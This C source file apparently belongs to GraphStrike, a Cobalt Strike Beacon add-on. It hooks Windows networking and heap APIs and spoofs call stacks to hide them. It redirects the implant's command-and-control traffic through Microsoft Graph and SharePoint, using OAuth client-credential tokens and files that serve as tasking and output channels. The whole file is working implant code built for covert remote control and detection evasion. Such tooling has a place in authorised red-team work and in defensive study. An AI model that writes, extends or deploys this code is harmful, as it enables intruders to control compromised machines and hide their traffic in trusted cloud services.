#include "hooks.h"

SECTION( D ) PVOID RtlAllocateHeap_Hook( PVOID heapHandle, ULONG flags, SIZE_T size )
{
    // Resolve API's
    struct MemAddrs* pMemAddrs = *(struct MemAddrs**)((PMEMADDR) OFFSET ( MemAddr ) )->address;    

    return SPOOF( pMemAddrs->Api.ntdll.RtlAllocateHeap, pMemAddrs->Api.ntdll.hNtdll, pMemAddrs->Api.ntdll.size, heapHandle, C_PTR( U_PTR( flags ) ), C_PTR( U_PTR ( size ) ) );
};

SECTION( D ) LPVOID HeapAlloc_Hook( HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes )
{
    return RtlAllocateHeap_Hook( hHeap, dwFlags, dwBytes );
};

SECTION( D ) NTSTATUS NtWaitForSingleObject_Hook( HANDLE handle, BOOLEAN alertable, PLARGE_INTEGER timeout )
{
    // Resolve API's
    struct MemAddrs* pMemAddrs = *(struct MemAddrs**)((PMEMADDR) OFFSET ( MemAddr ) )->address;

    return ( NTSTATUS )U_PTR( SPOOF( pMemAddrs->Api.ntdll.NtWaitForSingleObject, pMemAddrs->Api.ntdll.hNtdll, pMemAddrs->Api.ntdll.size, handle, C_PTR( U_PTR( alertable ) ), timeout ) );
};

SECTION( D ) HINTERNET InternetConnectA_Hook( HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext )
{
    // Resolve API's
    struct MemAddrs* pMemAddrs = *(struct MemAddrs**)((PMEMADDR) OFFSET ( MemAddr ) )->address;

    #ifdef DEBUG  
        pMemAddrs->Api.user32.MessageBoxA(NULL, C_PTR( OFFSET( "InternetConnectA!" ) ), C_PTR( OFFSET( "ALERT" ) ), 0);                 
    #endif

    // Only do this the first time through this function to check if this is actually a GraphStrike Beacon as opposed to a regular Beacon created with GraphStrike loaded
    if (pMemAddrs->graphStrike == (BOOL) U_PTR( NULL ))
    {
        // Convert lpszServerName to lowercase just in case
        char* serverCopy = (char *)pMemAddrs->Api.msvcrt.calloc(pMemAddrs->Api.msvcrt.strlen(lpszServerName) + 1, sizeof(char));
        pMemAddrs->Api.msvcrt.strcpy(serverCopy, lpszServerName);
        unsigned char* mod = (unsigned char*)serverCopy;

        while(*mod)
        {
            *mod = pMemAddrs->Api.msvcrt.tolower(*mod);
            mod++;
        }
    
        if (pMemAddrs->Api.msvcrt.strcmp((char*)serverCopy, C_PTR ( OFFSET ( "graph.microsoft.com" ) )) == 0)
            pMemAddrs->graphStrike = TRUE;
        else
            pMemAddrs->graphStrike = FALSE;
        
        pMemAddrs->Api.msvcrt.free(serverCopy);
    }

    // Store hInternet handle for later
    pMemAddrs->hInternet = hInternet;

    return ( HINTERNET )SPOOF( pMemAddrs->Api.net.InternetConnectA, pMemAddrs->Api.net.hNet, pMemAddrs->Api.net.size, hInternet, C_PTR( lpszServerName ), C_PTR( U_PTR( nServerPort ) ), C_PTR( lpszUserName ), C_PTR( lpszPassword ), C_PTR( U_PTR ( dwService ) ), C_PTR( U_PTR( dwFlags ) ), C_PTR( U_PTR( dwContext ) ) );
};

SECTION( D ) VOID ParseValue(char* string, char* token, char* outBuffer, int outBufferLen, BOOL isDigit, struct MemAddrs* pMemAddrs)
{
    // Find the supplied token within the string, and increment pointer by length of token
    LPVOID dataStart = pMemAddrs->Api.msvcrt.strstr(string, token) + pMemAddrs->Api.msvcrt.strlen(token);

    // Determine how many characters make up the size value (e.g. size could be '0' or '249323')
    char *p = (char*)dataStart;
    int count = 0;

    // We support two modes, one for finding digits, and one that looks for a terminating '"' character
    if( isDigit )
    {
        while(*p)
        {
            if (pMemAddrs->Api.msvcrt.isdigit(*p))
                count++;
            else
                break;
            p++;
        }
    }
    else
    {   
        LPVOID endChar = (LPVOID)pMemAddrs->Api.msvcrt.strstr(dataStart, C_PTR ( OFFSET ( "\"" ) ));
        count = endChar - dataStart;
    }

    // Copy parsed value into output buffer
    pMemAddrs->Api.msvcrt.memset(outBuffer, 0, outBufferLen);
    pMemAddrs->Api.msvcrt.memcpy(outBuffer, dataStart, count);

    return;
};

SECTION( D ) LPVOID MakeWebRequest(HANDLE hInternet, PVOID site, PVOID uri, PVOID verb, PVOID headers, PVOID content, struct MemAddrs* pMemAddrs)
{
    LPVOID lpResult = NULL;
    LPVOID addr     = NULL;
   
    if (pMemAddrs->Api.msvcrt.strcmp(site, LOGIN_ADDRESS) == 0)
        addr = ResolveAddress(pMemAddrs);

    // Connect to site
    HINTERNET hSite = ( HINTERNET )SPOOF( pMemAddrs->Api.net.InternetConnectA, pMemAddrs->Api.net.hNet, pMemAddrs->Api.net.size, hInternet, site, C_PTR( U_PTR( INTERNET_DEFAULT_HTTPS_PORT ) ), NULL, NULL, C_PTR( U_PTR( INTERNET_SERVICE_HTTP ) ), 0, C_PTR( U_PTR( (DWORD_PTR)NULL ) ) );

    if (hSite)
    {
        // Create http request 
        LPCSTR acceptTypes[] = { C_PTR ( OFFSET ( "*/*" ) ), NULL };
        HINTERNET hReq = ( HINTERNET )SPOOF( pMemAddrs->Api.net.HttpOpenRequestA, pMemAddrs->Api.net.hNet, pMemAddrs->Api.net.size, hSite, verb, uri, NULL, NULL, acceptTypes, C_PTR( U_PTR( INTERNET_FLAG_SECURE | INTERNET_FLAG_DONT_CACHE ) ), 0);

        if (hReq)
        {
            // Set headers + content length values
            DWORD headersLen = 0;
            DWORD contentLen = 0;
            if (headers != NULL)
                headersLen = (DWORD)pMemAddrs->Api.msvcrt.strlen(headers);
            if (content != NULL)
                contentLen = (DWORD)pMemAddrs->Api.msvcrt.strlen(content);

            // Send http request using specified headers and content
            if ((BOOL) U_PTR ( SPOOF( pMemAddrs->Api.net.HttpSendRequest, pMemAddrs->Api.net.hNet, pMemAddrs->Api.net.size, C_PTR ( hReq ), headers, C_PTR ( U_PTR( headersLen ) ), content, C_PTR ( U_PTR ( contentLen ) ) ) ) == TRUE)
            {
                // Allocate a buffer to receive response from server
                // This should really be allocated dynamically, but 5K is enough for the requests we are making.
                lpResult = pMemAddrs->Api.msvcrt.calloc(5000, sizeof(char));

                // Call InternetReadFile in a loop until we have read everything.  
                DWORD dwBytesRead = 0, currbytes_read;
                BOOL bKeepReading = TRUE;
                do
                {
                    bKeepReading = (BOOL) U_PTR ( SPOOF( pMemAddrs->Api.net.InternetReadFile, pMemAddrs->Api.net.hNet, pMemAddrs->Api.net.size, C_PTR ( hReq ), C_PTR ( lpResult + dwBytesRead ), C_PTR ( U_PTR ( 5000 - dwBytesRead ) ), C_PTR ( U_PTR ( &currbytes_read ) ) ) );
                    dwBytesRead += currbytes_read;
                } while (bKeepReading && currbytes_read);
            }
            
            // Close handle to request
            SPOOF( pMemAddrs->Api.net.InternetCloseHandle, pMemAddrs->Api.net.hNet, pMemAddrs->Api.net.size, hReq );
        }

        // Close handle to site
        SPOOF( pMemAddrs->Api.net.InternetCloseHandle, pMemAddrs->Api.net.hNet, pMemAddrs->Api.net.size, hSite);
    }

    if (addr)
        pMemAddrs->Api.msvcrt.free(addr); 

    return lpResult;
};

SECTION( D ) HINTERNET HttpOpenRequestA_Hook( HINTERNET hInternet, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext )
{
    HINTERNET       hResult = INVALID_HANDLE_VALUE;
    LARGE_INTEGER   currentTime, frequency;
    PVOID           verb, uri, tempUri, headers, content, response;
    size_t          reqSize;
    int             elapsedTime;
    CHAR            size[10] = {0};
    CHAR            id[100] = {0};

    // Resolve API's
    struct MemAddrs* pMemAddrs = *(struct MemAddrs**)((PMEMADDR) OFFSET ( MemAddr ) )->address;

    #ifdef DEBUG
        pMemAddrs->Api.user32.MessageBoxA(NULL, C_PTR( OFFSET( "HttpOpenRequest!" ) ), C_PTR( OFFSET( "ALERT" ) ), 0);
    #endif

    // Only run the following if this is a GraphStrike Beacon
    if (pMemAddrs->graphStrike)
    {
        // Determine whether this call to HttpOpenRequestA is for a http-get or http-post request
        if (pMemAddrs->Api.msvcrt.strcmp(lpszVerb, C_PTR ( OFFSET ( "GET" ) ) ) == 0)
            pMemAddrs->activeGet = TRUE;
        else
            pMemAddrs->activeGet = FALSE;

        // Calculate how many seconds have elapsed since we last fetched out access token.
        pMemAddrs->Api.k32.QueryPerformanceFrequency(&frequency);
        pMemAddrs->Api.k32.QueryPerformanceCounter(&currentTime);
        elapsedTime = (currentTime.QuadPart - pMemAddrs->lastTokenTime) / frequency.QuadPart;
        
        // MSFT Bearer tokens are good for 3599 seconds. If we are getting close to token expiry, fetch a new one.
        if (pMemAddrs->firstGet || elapsedTime > 3100)
        {
            // ------------------------------------ Get Access Token ---------------------------------------

            #ifdef DEBUG
                pMemAddrs->Api.user32.MessageBoxA(NULL, C_PTR( OFFSET( "Getting access token!" ) ), C_PTR( OFFSET( "ALERT" ) ), 0);
            #endif

            // Define headers to be used
            headers = C_PTR ( OFFSET ( "Host: login.microsoft.com\r\nContent-Type: application/x-www-form-urlencoded" ) );

            // Allocate and assemble uri
            reqSize = pMemAddrs->Api.msvcrt.strlen(TENANT_ID) + pMemAddrs->Api.msvcrt.strlen( C_PTR ( OFFSET ( "//oauth2/v2.0/token" ) ) ) + 1;
            tempUri = pMemAddrs->Api.msvcrt.calloc(reqSize, sizeof(char));
            pMemAddrs->Api.msvcrt.sprintf(tempUri, C_PTR ( OFFSET ( "/%s/oauth2/v2.0/token" ) ), TENANT_ID);

            // Allocate and assemble content
            reqSize = pMemAddrs->Api.msvcrt.strlen(APP_CLIENT_ID) + pMemAddrs->Api.msvcrt.strlen(APP_CLIENT_SECRET) + pMemAddrs->Api.msvcrt.strlen(GRAPH_ADDRESS) + 
                pMemAddrs->Api.msvcrt.strlen( C_PTR ( OFFSET ( "grant_type=client_credentials&client_id=&client_secret=&scope=https\%3A\%2F\%2F\%2F.default" ) ) ) + 1;
            content = pMemAddrs->Api.msvcrt.calloc(reqSize, sizeof(char));
            pMemAddrs->Api.msvcrt.sprintf(content, C_PTR ( OFFSET ( "grant_type=client_credentials&client_id=%s&client_secret=%s&scope=https%%3A%%2F%%2F%s%%2F.default" ) ), APP_CLIENT_ID, APP_CLIENT_SECRET, GRAPH_ADDRESS);

            // Make web request
            response = MakeWebRequest(pMemAddrs->hInternet, LOGIN_ADDRESS, tempUri, POST_VERB, headers, content, pMemAddrs);
            if (!response)
                return INVALID_HANDLE_VALUE;  

            // Parse out returned auth token
            char* delimiter = C_PTR ( OFFSET ( "access_token\":\"" ) );
            char* accessToken = pMemAddrs->Api.msvcrt.strstr(response, delimiter) + pMemAddrs->Api.msvcrt.strlen(delimiter);

            // Null terminate accessToken to remove brackets and quotes
            pMemAddrs->Api.msvcrt.memset(accessToken + pMemAddrs->Api.msvcrt.strlen(accessToken) - 2, 0, 2);

            // Allocate and/or clear httpGetHeaders
            if (pMemAddrs->httpGetHeaders == NULL)
                pMemAddrs->httpGetHeaders = C_PTR ( pMemAddrs->Api.msvcrt.calloc(2000, sizeof(char)) );
            else
                pMemAddrs->Api.msvcrt.memset(pMemAddrs->httpGetHeaders, 0, 2000);

            // Allocate and/or clear httpPostHeaders
            if (pMemAddrs->httpPostHeaders == NULL)
                pMemAddrs->httpPostHeaders = C_PTR ( pMemAddrs->Api.msvcrt.calloc(2000, sizeof(char)) );
            else
                pMemAddrs->Api.msvcrt.memset(pMemAddrs->httpPostHeaders, 0, 2000);
            
            // Update last token time
            pMemAddrs->lastTokenTime = currentTime.QuadPart;

            // Assemble http-get headers to be used by subsequent requests
            pMemAddrs->Api.msvcrt.sprintf(pMemAddrs->httpGetHeaders, C_PTR ( OFFSET ( "Host: %s\r\nAuthorization: %s" ) ), GRAPH_ADDRESS, accessToken);
            pMemAddrs->httpGetHeadersLen = C_PTR( U_PTR ( pMemAddrs->Api.msvcrt.strlen(pMemAddrs->httpGetHeaders) ) );

            // Assemble http-post headers to be used by subsequent requests
            pMemAddrs->Api.msvcrt.sprintf(pMemAddrs->httpPostHeaders, C_PTR ( OFFSET ( "Host: %s\r\nAuthorization: %s\r\nContent-Type: application/octect-stream" ) ), GRAPH_ADDRESS, accessToken);
            pMemAddrs->httpPostHeadersLen = C_PTR( U_PTR ( pMemAddrs->Api.msvcrt.strlen(pMemAddrs->httpPostHeaders) ) );

            #ifdef DEBUG
                pMemAddrs->Api.user32.MessageBoxA(NULL, C_PTR( OFFSET( "http-get headers" ) ), C_PTR( OFFSET( "ALERT" ) ), 0);
                pMemAddrs->Api.user32.MessageBoxA(NULL, pMemAddrs->httpGetHeaders, C_PTR( OFFSET( "ALERT" ) ), 0);
                pMemAddrs->Api.user32.MessageBoxA(NULL, C_PTR( OFFSET( "http-post headers" ) ), C_PTR( OFFSET( "ALERT" ) ), 0);
                pMemAddrs->Api.user32.MessageBoxA(NULL, pMemAddrs->httpPostHeaders, C_PTR( OFFSET( "ALERT" ) ), 0);
            #endif

            // Cleanup
            pMemAddrs->Api.msvcrt.memset(tempUri, 0, pMemAddrs->Api.msvcrt.strlen(tempUri));
            pMemAddrs->Api.msvcrt.memset(content, 0, pMemAddrs->Api.msvcrt.strlen(content));
            pMemAddrs->Api.msvcrt.memset(response, 0, pMemAddrs->Api.msvcrt.strlen(response));
            pMemAddrs->Api.msvcrt.free(tempUri);
            pMemAddrs->Api.msvcrt.free(content);
            pMemAddrs->Api.msvcrt.free(response);
        }

        // If this is the first GET request for the Beacon, we need to create the TS output file for the Beacon to read from. 
        if (pMemAddrs->firstGet)
        {
            // ------------------------------------ Upload new file for TS tasking ---------------------------------------

            #ifdef DEBUG
                pMemAddrs->Api.user32.MessageBoxA(NULL, C_PTR( OFFSET( "First get!" ) ), C_PTR( OFFSET( "ALERT" ) ), 0);
            #endif            

            // Assemble URI to create new file in SharePoint using the Beacon metadata as a name
            tempUri = C_PTR ( pMemAddrs->Api.msvcrt.calloc(1000, sizeof(char)) );
            LPCSTR fileName = pMemAddrs->Api.msvcrt.strstr(lpszObjectName, HTTP_GET_PREFIX ) + pMemAddrs->Api.msvcrt.strlen(HTTP_GET_PREFIX);
            pMemAddrs->Api.msvcrt.sprintf(tempUri, C_PTR ( OFFSET ( "%s/root:/%s:/content" ) ), SHAREPOINT_ADDRESS, fileName );

            // Store metaData to be used later to create the Beacon output channel as well 
            pMemAddrs->metaData = (char*)pMemAddrs->Api.msvcrt.calloc(pMemAddrs->Api.msvcrt.strlen(fileName) + 1, sizeof(char));
            pMemAddrs->Api.msvcrt.strcpy(pMemAddrs->metaData, fileName);

            response = MakeWebRequest(pMemAddrs->hInternet, GRAPH_ADDRESS, tempUri, PUT_VERB, pMemAddrs->httpPostHeaders, NULL, pMemAddrs );
            if (!response)
                return INVALID_HANDLE_VALUE;

            // Parse out fileId from response
            ParseValue((char*)response, (char*)C_PTR ( OFFSET ( "id\":\"" ) ), id, 100, FALSE, pMemAddrs);

            // Assemble httpGetUri that will be used for subsequent Beacon comms
            reqSize = pMemAddrs->Api.msvcrt.strlen(SHAREPOINT_ADDRESS) + pMemAddrs->Api.msvcrt.strlen(id) + pMemAddrs->Api.msvcrt.strlen(C_PTR ( OFFSET ( "/items//content" ) ) + 1);
            pMemAddrs->httpGetUri = pMemAddrs->Api.msvcrt.calloc(reqSize, sizeof(char));
            pMemAddrs->Api.msvcrt.sprintf(pMemAddrs->httpGetUri, C_PTR ( OFFSET ( "%s/items/%s/content") ), SHAREPOINT_ADDRESS, id);

            // Free buffers
            pMemAddrs->Api.msvcrt.free(response);
            pMemAddrs->Api.msvcrt.free(tempUri);

            // Toggle firstGet to false so we don't repeat this loop.
            pMemAddrs->firstGet = FALSE;
        }

        // If this is the first POST request for the Beacon, create the Beacon output file for the TS to read from.
        if ( pMemAddrs->firstPost && !pMemAddrs->activeGet)
        {        
            // ------------------------------------ Upload new file for Beacon output ---------------------------------------

            #ifdef DEBUG
                pMemAddrs->Api.user32.MessageBoxA(NULL, C_PTR( OFFSET( "First post!" ) ), C_PTR( OFFSET( "ALERT" ) ), 0);
            #endif    

            // Assemble URI to create new file in SharePoint using the Beacon metadata + beaconId as a name.
            tempUri = C_PTR ( pMemAddrs->Api.msvcrt.calloc(1000, sizeof(char)) );
            LPCSTR beaconId = pMemAddrs->Api.msvcrt.strstr(lpszObjectName, HTTP_POST_PREFIX ) + pMemAddrs->Api.msvcrt.strlen(HTTP_POST_PREFIX);
            pMemAddrs->Api.msvcrt.sprintf(tempUri, C_PTR ( OFFSET ( "%s/root:/%s%s%s:/content" ) ), SHAREPOINT_ADDRESS, pMemAddrs->metaData, BID_DELIMITER, beaconId );

            // Send request
            response = MakeWebRequest(pMemAddrs->hInternet, GRAPH_ADDRESS, tempUri, PUT_VERB, pMemAddrs->httpPostHeaders, NULL, pMemAddrs ); 

            // Parse out fileId from response
            ParseValue((char*)response, (char*)C_PTR ( OFFSET ( "id\":\"" ) ), id, 100, FALSE, pMemAddrs);

            // Assemble httpPostUri that will be used for subsequent Beacon comms
            reqSize = pMemAddrs->Api.msvcrt.strlen(SHAREPOINT_ADDRESS) + pMemAddrs->Api.msvcrt.strlen(id) + pMemAddrs->Api.msvcrt.strlen(C_PTR ( OFFSET ( "/items//content" ) ) + 1);
            pMemAddrs->httpPostUri = pMemAddrs->Api.msvcrt.calloc(reqSize, sizeof(char));
            pMemAddrs->Api.msvcrt.sprintf(pMemAddrs->httpPostUri, C_PTR ( OFFSET ( "%s/items/%s/content") ), SHAREPOINT_ADDRESS, id);

            // Assemble httpPostCheckSizeUrl by trimming off "/content" from the end of the httpPostUri.
            int copyLen = (PVOID)(pMemAddrs->Api.msvcrt.strstr(pMemAddrs->httpPostUri, C_PTR ( OFFSET ( "/content" ) ))) - pMemAddrs->httpPostUri;
            pMemAddrs->httpPostCheckSizeUrl = pMemAddrs->Api.msvcrt.calloc(copyLen + 1, sizeof(char));
            pMemAddrs->Api.msvcrt.memcpy(pMemAddrs->httpPostCheckSizeUrl, pMemAddrs->httpPostUri, copyLen);

            // Free buffers
            pMemAddrs->Api.msvcrt.free(tempUri);
            pMemAddrs->Api.msvcrt.free(response);

            // Toggle firstPost to false so we don't repeat this loop.
            pMemAddrs->firstPost = FALSE; 
        }

        // If this is a POST request, we may need to do some extra handling to ensure no data loss.
        if (!pMemAddrs->activeGet)
        {
            #ifdef DEBUG
                pMemAddrs->Api.user32.MessageBoxA(NULL, C_PTR( OFFSET( "Post request branch!" ) ), C_PTR( OFFSET( "ALERT" ) ), 0);
            #endif
           
            // Loop until we see that the Beacon output file size is 0
            while (TRUE)
            {
                // Send request
                response = MakeWebRequest(pMemAddrs->hInternet, GRAPH_ADDRESS, pMemAddrs->httpPostCheckSizeUrl, GET_VERB, pMemAddrs->httpGetHeaders, NULL, pMemAddrs );

                // Parse out size of file from response
                ParseValue((char*)response, (char*)C_PTR ( OFFSET ( "size\":" ) ), size, 10, TRUE, pMemAddrs);

                // Free buffer
                pMemAddrs->Api.msvcrt.free(response);

                // If the size of the Beacon output file isn't 0, the TS has not processes the last output from Beacon. Sleep 1 sec and retry
                if (pMemAddrs->Api.msvcrt.strcmp(size, C_PTR ( OFFSET ( "0" ) )) != 0)
                    pMemAddrs->Api.k32.Sleep(500);
                else
                    break;
            }
        }

        // Set verb and uri to be used with HttpOpenRequest call.
        // Must be done here so that httpGetUri + httpPostUri are populated first
        if ( pMemAddrs->activeGet)
        {            
            verb = GET_VERB;
            uri = pMemAddrs->httpGetUri;
        }
        else
        {
            verb = PUT_VERB;
            uri = pMemAddrs->httpPostUri;
        }

        // Finally send request.
        hResult =  ( HINTERNET )SPOOF( pMemAddrs->Api.net.HttpOpenRequestA, pMemAddrs->Api.net.hNet, pMemAddrs->Api.net.size, hInternet, verb, uri, C_PTR( lpszVersion ), C_PTR( lpszReferrer ), C_PTR( lplpszAcceptTypes ), C_PTR( U_PTR( dwFlags ) ), C_PTR( U_PTR( dwContext ) ) );
    }
    // If not a GraphStrike Beacon, make a normal call to HttpOpenRequestA
    else
        hResult =  ( HINTERNET )SPOOF( pMemAddrs->Api.net.HttpOpenRequestA, pMemAddrs->Api.net.hNet, pMemAddrs->Api.net.size, hInternet, C_PTR( lpszVerb ), C_PTR( lpszObjectName ), C_PTR( lpszVersion ), C_PTR( lpszReferrer ), C_PTR( lplpszAcceptTypes ), C_PTR( U_PTR( dwFlags ) ), C_PTR( U_PTR( dwContext ) ) );

    return hResult;
};

SECTION( D ) BOOL HttpSendRequestA_Hook( HINTERNET hInternet, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength )
{
    BOOL bResult = FALSE;

    // Resolve API's
    struct MemAddrs* pMemAddrs = *(struct MemAddrs**)((PMEMADDR) OFFSET ( MemAddr ) )->address;

    #ifdef DEBUG
        pMemAddrs->Api.user32.MessageBoxA(NULL, C_PTR( OFFSET( "HttpSendRequest!" ) ), C_PTR( OFFSET( "ALERT" ) ), 0);
    #endif

    // Only run the following if this is a GraphStrike Beacon
    if (pMemAddrs->graphStrike)
    {
        if (pMemAddrs->activeGet == TRUE)
            bResult = ( BOOL )U_PTR( SPOOF( pMemAddrs->Api.net.HttpSendRequestA, pMemAddrs->Api.net.hNet, pMemAddrs->Api.net.size, hInternet, pMemAddrs->httpGetHeaders, pMemAddrs->httpGetHeadersLen, C_PTR( lpOptional ), C_PTR( U_PTR ( dwOptionalLength ) ) ) );
        else
            bResult = ( BOOL )U_PTR( SPOOF( pMemAddrs->Api.net.HttpSendRequestA, pMemAddrs->Api.net.hNet, pMemAddrs->Api.net.size, hInternet, pMemAddrs->httpPostHeaders, pMemAddrs->httpPostHeadersLen, C_PTR( lpOptional ), C_PTR( U_PTR ( dwOptionalLength ) ) ) );
    }
    else
        bResult = ( BOOL )U_PTR( SPOOF( pMemAddrs->Api.net.HttpSendRequestA, pMemAddrs->Api.net.hNet, pMemAddrs->Api.net.size, hInternet, C_PTR( lpszHeaders ), C_PTR( U_PTR ( dwHeadersLength ) ), C_PTR( lpOptional ), C_PTR( U_PTR ( dwOptionalLength ) ) ) ); 

    return bResult;
};

SECTION( D ) BOOL InternetReadFile_Hook( HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead )
{
    BOOL bResult = FALSE;

    // Resolve API's
    struct MemAddrs* pMemAddrs = *(struct MemAddrs**)((PMEMADDR) OFFSET ( MemAddr ) )->address;

    #ifdef DEBUG
        pMemAddrs->Api.user32.MessageBoxA(NULL, C_PTR( OFFSET( "InternetReadFile!" ) ), C_PTR( OFFSET( "ALERT" ) ), 0);
    #endif

    // Call InternetReadFile
    bResult = ( BOOL )U_PTR( SPOOF( pMemAddrs->Api.net.InternetReadFile, pMemAddrs->Api.net.hNet, pMemAddrs->Api.net.size, hFile, C_PTR ( lpBuffer ), C_PTR( U_PTR ( dwNumberOfBytesToRead ) ), C_PTR( U_PTR ( lpdwNumberOfBytesRead ) ) ) );

    // Only run the following if this is a GraphStrike Beacon
    if (pMemAddrs->graphStrike)
    {
        // If we are reading data from a GET request, set readTasking to TRUE
        if(pMemAddrs->activeGet && *lpdwNumberOfBytesRead > 0)
            pMemAddrs->readTasking = TRUE;

        // Beacon calls InternetReadFile until it reads 0 data. Once we are completely done reading output,
        // upload a blank file to the TS tasking file to signal server we are ready for more tasking.
        else if(pMemAddrs->readTasking && *lpdwNumberOfBytesRead == 0)
        {
            pMemAddrs->readTasking = FALSE;            
            LPVOID response = MakeWebRequest(pMemAddrs->hInternet, GRAPH_ADDRESS, pMemAddrs->httpGetUri, PUT_VERB, pMemAddrs->httpPostHeaders, NULL, pMemAddrs );
            if (response)
                pMemAddrs->Api.msvcrt.free(response);            
        }
    }

    return bResult;
};